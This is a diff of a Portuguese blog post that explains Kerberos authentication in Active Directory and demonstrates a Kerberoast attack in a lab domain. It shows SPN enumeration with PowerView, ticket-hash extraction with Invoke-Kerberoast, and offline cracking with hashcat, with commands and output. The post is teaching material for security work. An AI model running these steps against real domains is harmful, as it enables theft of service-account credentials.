@@ -9,9 +9,9 @@
     <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>
 
     
-    <meta name="description" content="Baseado na RFC 1510, o  Kerberos fornece autenticação para o ambiente de computação distribuído e padronização para interoperar com diversos sistemas operacionais. Em ambientes Microsoft Windows, o protocolo é instalado como parte do Active Directory Services, oferecendo o controle centralizado de gerenciamento de contas de usuários, serviços, computadores e recursos.
+    <meta name="description" content="O protocolo Kerberos fornece autenticação para o ambiente de computação possibilitando flexibilidade para operar entre diversos sistemas operacionais. Em ambientes Microsoft Windows, o protocolo é instalado como parte do Active Directory Services, ajudando no controle centralizado do gerenciamento de contas de usuários, computadores, grupos, serviços e recursos, desde que a Microsoft o adotou no Windows 2000, abandonando o processo de autenticação que na ocasião era através do NT LAN Manager (NTML) Challenge-Response.
 " />
-    <meta property="og:description" content="Baseado na RFC 1510, o  Kerberos fornece autenticação para o ambiente de computação distribuído e padronização para interoperar com diversos sistemas operacionais. Em ambientes Microsoft Windows, o protocolo é instalado como parte do Active Directory Services, oferecendo o controle centralizado de gerenciamento de contas de usuários, serviços, computadores e recursos.
+    <meta property="og:description" content="O protocolo Kerberos fornece autenticação para o ambiente de computação possibilitando flexibilidade para operar entre diversos sistemas operacionais. Em ambientes Microsoft Windows, o protocolo é instalado como parte do Active Directory Services, ajudando no controle centralizado do gerenciamento de contas de usuários, computadores, grupos, serviços e recursos, desde que a Microsoft o adotou no Windows 2000, abandonando o processo de autenticação que na ocasião era através do NT LAN Manager (NTML) Challenge-Response.
 " />
     
     <meta name="author" content="tuxtrack" />
@@ -56,19 +56,19 @@
   <h1>Kerberos & Kerberoast Attack</h1>
 
   <div class="entry">
-    <p>Baseado na RFC 1510, o  Kerberos fornece autenticação para o ambiente de computação distribuído e padronização para interoperar com diversos sistemas operacionais. Em ambientes Microsoft Windows, o protocolo é instalado como parte do Active Directory Services, oferecendo o controle centralizado de gerenciamento de contas de usuários, serviços, computadores e recursos.</p>
+    <p>O protocolo Kerberos fornece autenticação para o ambiente de computação possibilitando flexibilidade para operar entre diversos sistemas operacionais. Em ambientes Microsoft Windows, o protocolo é instalado como parte do Active Directory Services, ajudando no controle centralizado do gerenciamento de contas de usuários, computadores, grupos, serviços e recursos, desde que a Microsoft o adotou no Windows 2000, abandonando o processo de autenticação que na ocasião era através do <a href="https://en.wikipedia.org/wiki/NT_LAN_Manager">NT LAN Manager (NTML) Challenge-Response</a>.</p>
 
 <blockquote>
-  <p>Kerberos é um protocolo de autenticação usado para verificar a identidade de um usuário ou host. <a href="https://docs.microsoft.com/pt-br/windows-server/security/kerberos/kerberos-authentication-overview">Microsoft Docs</a></p>
+  <p>Kerberos é um protocolo de autenticação usado para verificar a identidade de um usuário ou host. <a href="https://docs.microsoft.com/pt-br/windows-server/security/kerberos/kerberos-authentication-overview">Microsoft</a></p>
 </blockquote>
 
 <h3 id="funcionamento-do-processo-de-autenticação">Funcionamento do processo de autenticação</h3>
 
 <ul>
-  <li>No momento em que o usuário faz logon utilizando credenciais de um domínio, o Local Security Authority Subsystem Service (LSASS) armazena o hash da senha. O LSASS armazena credenciais na memória em nome de usuários com sessões ativas do Windows.</li>
+  <li>No momento em que o usuário faz logon utilizando credenciais de um domínio, o Local Security Authority Subsystem Service (LSASS) armazena o hash da sua conta. O LSASS armazena credenciais na memória em nome de usuários com sessões ativas do Windows.</li>
 </ul>
 
-<p><img src="http://127.0.0.1:4000/images/kb101/01.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/images/kb101/01.png" alt="" /></p>
 
 <hr />
 
@@ -76,7 +76,7 @@
   <li>O TGT (Ticket-Granting-Ticket) será requisitado ao KDC (Key Distribution Center) service presente no DC (Domain Controller), utilizando algum dos algoritimos de criptografia (RC4_HMAC, DES_CBC_MD5, 128AES_HMAC, 256AES_HMAC…) baseando-se no <a href="https://docs.microsoft.com/pt-br/windows-server/identity/ad-ds/active-directory-functional-levels">Domain Level Function</a>.</li>
 </ul>
 
-<p><img src="http://127.0.0.1:4000/images/kb101/02.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/images/kb101/02.png" alt="" /></p>
 
 <hr />
 
@@ -84,9 +84,9 @@
   <li>Ocorrendo a validação da autenticação da conta, o Domain Controller retorna o TGT assinado com o hash da conta de serviço krbtgt (Key Distribution Center Service Account). krbtgt é a conta utilizada para criptografar e assinar todos os tickets do domínio, logo, se o hash da conta é comprometido, um atacante pode forjar tickets (Golden Tickets).</li>
 </ul>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\tux_wmi_recon.ps1</span><span class="w">
-</span><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Tux-GetUser</span><span class="w"> </span><span class="nx">krbtgt</span><span class="w">
-</span><span class="nf">User</span><span class="w"> </span><span class="nx">Information</span><span class="w"> </span><span class="nx">from:</span><span class="w"> </span><span class="nx">krbtgt</span><span class="w">
+<p>Através do cmdlet <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1">Get-WmiObject</a> do powershell, podemos obter informações sobre a conta krbtgt utilizando a classe <a href="https://wutils.com/wmi/root/directory/ldap/ads_account/">ads_account</a> presente no NameSpace <a href="https://wutils.com/wmi/root/directory/ldap/default.html">ROOT\directory\LDAP</a>.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Users\tuxtrack</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-WmiObject</span><span class="w"> </span><span class="nt">-Namespace</span><span class="w"> </span><span class="s2">"ROOT\directory\LDAP"</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">ads_account</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s2">"ds_user='krbtgt'"</span><span class="w">
 
 </span><span class="nf">DS_Name</span><span class="w">                 </span><span class="p">:</span><span class="w"> </span><span class="nx">krbtgt</span><span class="w">
 </span><span class="nf">ADSIPath</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">LDAP://CN</span><span class="o">=</span><span class="nf">krbtgt</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nf">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">hnr</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">local</span><span class="w">
@@ -95,15 +95,15 @@
 </span><span class="nf">DS_memberOf</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nf">CN</span><span class="o">=</span><span class="nf">Denied</span><span class="w"> </span><span class="nx">RODC</span><span class="w"> </span><span class="nx">Password</span><span class="w"> </span><span class="nx">Replication</span><span class="w"> </span><span class="nx">Group</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nf">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">hnr</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">local</span><span class="p">}</span><span class="w">
 </span></code></pre></div></div>
 
-<p><img src="http://127.0.0.1:4000/images/kb101/03.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/images/kb101/03.png" alt="" /></p>
 
 <hr />
 
 <ul>
-  <li>Para que o usuário possa utilizar algum serviço do domínio, o processo de autorização se dá através do envio do TGT ao Domain Controller para a requisição do Service Ticket ou TGS (Ticket-Grating-Service), ex.: MSSqlSvc/SQL.domain.com.</li>
+  <li>Para que o usuário possa utilizar algum serviço do domínio, o processo de autorização se dá através do envio do TGT ao Domain Controller para a requisição do Service Ticket ou TGS (Ticket-Granting-Service), ex.: MSSqlSvc/SQL.domain.com.</li>
 </ul>
 
-<p><img src="http://127.0.0.1:4000/images/kb101/04.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/images/kb101/04.png" alt="" /></p>
 
 <hr />
 
@@ -111,27 +111,27 @@
   <li>O Domain Controller retorna o Service Ticket (TGS) correspondente ao serviço solicitado, após identificar qual conta de usuário/computador possui o serviço solicitado. O ticket retornado é criptografado com o hash da conta de usuário/computador correspondente ao serviço.</li>
 </ul>
 
-<p><img src="http://127.0.0.1:4000/images/kb101/05.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/images/kb101/05.png" alt="" /></p>
 
 <hr />
 
 <ul>
-  <li>O Service Ticket (TGS) é apresentado ao server que armazena o serviço solicitado, o servidor descriptografa o hash utilizando seu próprio hash (Hash esse que foi utilizado pelo DC para criptografar o TGS no passo anterior) e o serviço é acessado.</li>
+  <li>O Service Ticket (TGS) é apresentado ao server que armazena o serviço solicitado, o servidor descriptografa o hash utilizando seu próprio hash (Hash esse que foi utilizado pelo DC para criptografar o TGS no passo anterior) e o acesso ao serviço é concedido.</li>
 </ul>
 
-<p><img src="http://127.0.0.1:4000/images/kb101/06.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/images/kb101/06.png" alt="" /></p>
 
 <hr />
 
 <h3 id="kerberoast">Kerberoast</h3>
 
-<p>Kerberoast é o nome de um ataque ao processo de assinatura de um Service Ticket. TGS’s tickets são criptografados com hash NTLM da conta de domínio utilizada como conta de serviço que utilize o kerberos para autenticação, no caso abaixo, a conta sqlserver para o SPN MSSQLSvc/SQL.hnr.local (TGS-REP). O acesso ao serviço não é necessário para se ter acesso ao ticket de serviço, já que como mostrado anteriormente, para requisitar um TGS, o atacante necessita apenas do TGT (TGS-REQ).</p>
+<p>Kerberoast é o nome dado ao ataque no processo de assinatura de um Service Ticket. TGS’s tickets são criptografados com hash NTLM da conta de domínio utilizada como conta de serviço que utilize o kerberos para autenticação, no caso abaixo, a conta sqlserver para o SPN MSSQLSvc/SQL.hnr.local (TGS-REP). O acesso ao serviço não é necessário para se ter acesso ao ticket de serviço, já que como mostrado anteriormente, para requisitar um TGS, o atacante necessita apenas do TGT (TGS-REQ).</p>
 
 <blockquote>
   <p>SPN - A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. This allows a client application to request that the service authenticate an account even if the client does not have the account name. <a href="https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names">MSDN</a></p>
 </blockquote>
 
-<p>Listagem de SPN’s do domínio utilizando o módulo Get-NetUser do <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>, ou poderíamos utilizar a própria ferramenta do Windows,  <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v%3Dws.11)">setspn.exe</a>.</p>
+<p>É necessário ao atacante listar todos os SPN’s presentes no domínio. Uma das formas de enumará-los é utilizando o módulo Get-NetUser do <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a> projeto que reúne diversas formas de enumeração em ambiente Microsoft Active Directory, ou poderíamos utilizar a ferramenta <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v%3Dws.11)">setspn.exe</a> seguindo do argumento “-L ServerName”, presente por padrão nos sistemas operacionais Microsoft Windows.</p>
 
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Users\charris\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-NetUser</span><span class="w"> </span><span class="nt">-SPN</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">hnr.local</span><span class="w">                                                                                                                                      
 
@@ -205,7 +205,7 @@
 </span><span class="nf">pwdlastset</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="nx">2/12/2020</span><span class="w"> </span><span class="nx">8:10:04</span><span class="w"> </span><span class="nx">PM</span><span class="w">
 </span><span class="nf">usnchanged</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="nx">32844</span><span class="w">
 </span></code></pre></div></div>
-<p>Extração do ticket criptografado do TGS-REP, utilizando o módulo <a href="https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/">Invoke-Kerberoast</a>:</p>
+<p>Após a enumeração, como informado anteriormente, o atacante de posse do TGT precisa requisitar o TGS para o serviço alvo assinado pela conta do usuário/computador correspondente. A extração do ticket criptografado do TGS-REP, pode ser executada utilizando o módulo <a href="https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/">Invoke-Kerberoast</a> presente no toolkit <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a>.</p>
 
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Users\charris\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-Kerberoast</span><span class="w"> </span><span class="nt">-domain</span><span class="w"> </span><span class="nx">hnr.local</span><span class="w"> </span><span class="nt">-OutputFormat</span><span class="w"> </span><span class="nx">Hashcat</span><span class="w">                                                                                                               
 
@@ -228,7 +228,7 @@
 </span><span class="nf">DistinguishedName</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="nf">SQLServer</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nf">Managed</span><span class="w"> </span><span class="nx">Service</span><span class="w"> </span><span class="nx">Accounts</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">hnr</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">local</span><span class="w">
 </span><span class="nf">ServicePrincipalName</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">MSSQLSvc/SQL.hnr.local:1433</span><span class="w">
 </span></code></pre></div></div>
-<p>Processo de tentativa de descoberta da credencial com <a href="https://hashcat.net/hashcat/">HashCat</a>.</p>
+<p>Com a extração do hash, o ataque se dá offline através da tentativa de descoberta da credencial utilizando wordlists em um processo de “quebra” do hash mencionado. Para exemplificar, foi utilizada como ferramenta o <a href="https://hashcat.net/hashcat/">HashCat</a>.</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat-5.1.0 ./hashcat64.bin -a 0 -m 13100 hash.txt ~/tools/wordlist/br-wordlist.txt
 hashcat (v5.1.0) starting...
@@ -307,26 +307,26 @@ Hardware.Mon.#1..: Temp: 49c Util: 33% Core:1019MHz Mem:2505MHz Bus:16
 Started: Thu Feb 13 11:07:28 2020
 Stopped: Thu Feb 13 11:07:39 2020
 </code></pre></div></div>
+<p>Havendo sucesso, a senha é descoberta e o atacante poderá ter acesso a conta de serviço.</p>
 
-<p>Lista de SPN’s: <a href="https://adsecurity.org/?page_id=183">https://adsecurity.org/?page_id=183</a></p>
+<p>Bom, é isso ai!! Caso eu tenha errado em algo, ou alguma explicação precise ser melhorada, por favor entrem em contato comigo via twitter @tuxtrack ou por email: tuxtrack@hacknroll.com.</p>
 
-<h2 id="golden-ticket">Golden Ticket</h2>
-<ul>
-  <li>Silver Ticket</li>
-  <li>Over Pass The Hash</li>
-  <li>Pass The Ticket</li>
-</ul>
-
-<p>Espero ter coragem para escrever sobre como funcionam os ataques nos próximos posts.</p>
+<p>Happy Hacking and HackN’Roll \m/</p>
 
 <p>References:</p>
 
-<p><a href="https://social.technet.microsoft.com/wiki/contents/articles/4209.kerberos-survival-guide.aspx">Kerberos Survival Guide</a></p>
+<ul>
+  <li><a href="https://social.technet.microsoft.com/wiki/contents/articles/4209.kerberos-survival-guide.aspx">Kerberos Survival Guide</a></li>
+  <li><a href="https://malicious.link/post/2016/kerberoast-pt1/">Mubix Kerberoast Part 01</a></li>
+  <li><a href="https://malicious.link/post/2016/kerberoast-pt2/">Mubix Kerberoast Part 02</a></li>
+  <li><a href="https://malicious.link/post/2016/kerberoast-pt3/">Mubix Kerberoast Part 03</a></li>
+</ul>
+
 
   </div>
 
   <div class="date">
-    Written on February  9, 2020
+    Written on February 13, 2020
   </div>
 
   
